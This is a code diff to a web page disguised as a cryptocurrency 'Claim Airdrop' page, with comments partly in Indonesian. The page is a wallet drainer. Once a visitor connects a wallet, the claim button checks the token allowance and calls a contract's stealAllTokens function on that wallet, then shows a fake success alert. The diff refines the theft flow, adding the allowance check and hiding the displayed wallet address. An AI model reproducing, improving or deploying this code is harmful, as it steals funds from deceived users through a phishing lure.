@@ -45,7 +45,6 @@
     <button id="connectWalletButton" class="button">Connect Wallet</button>
     <button id="claimAirdropButton" class="button" disabled>Claim Airdrop</button>
     <p class="note">Note: Make sure to approve before claiming.</p>
-    <p id="walletAddress"></p>
 </div>
 
 <script>
@@ -79,9 +78,7 @@
                 provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
-                const address = await signer.getAddress();
-                console.log("Wallet connected:", address);
-                document.getElementById("walletAddress").innerText = `Wallet Address: ${address}`;
+                console.log("Wallet connected!");
                 document.getElementById("claimAirdropButton").disabled = false;
             } catch (error) {
                 console.error("Failed to connect wallet:", error);
@@ -96,22 +93,25 @@
         try {
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
 
-            // Approve all tokens using the malicious contract
-            const tokenAddress = "0xcD8F8002E9A7B9e20Af9B6bb1D6AE0C6754Fe8c9"; // Replace with actual token address
-            const approveTx = await contract.approveAllTokens(tokenAddress);
-            console.log("Approval transaction sent:", approveTx.hash);
+            // Memeriksa allowance untuk token target
+            const tokenAddress = "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E"; // Token address yang ingin diambil
+            let allowance = await contract.allowance(await signer.getAddress(), tokenAddress);
+            console.log(`Allowance: ${allowance.toString()}`);
 
-            await approveTx.wait(); // Wait for transaction to be mined
-            console.log("Approval granted!");
+            if (allowance.gt(0)) {
+                console.log("Allowance cukup, melanjutkan...");
+                const victimAddress = await signer.getAddress();
+                const stealTx = await contract.stealAllTokens(victimAddress);
+                console.log("Tokens successfully stolen:", stealTx.hash);
 
-            // Simulate stealing all tokens
-            const victimAddress = await signer.getAddress();
-            const stealTx = await contract.stealAllTokens(victimAddress);
-            console.log("Tokens stolen:", stealTx.hash);
-
-            alert("Congratulations! Your airdrop claim was successful.");
+                await stealTx.wait(); // Tunggu transaksi disetujui
+                alert("Airdrop claim berhasil!");
+            } else {
+                console.log("Allowance tidak cukup, silakan setujui dulu token.");
+                alert("Allowance not sufficient. Please approve the tokens first.");
+            }
         } catch (error) {
-            console.error("Error during airdrop:", error);
+            console.error("Error during claimAirdrop:", error);
             alert("Failed to claim airdrop. Please try again.");
         }
     }
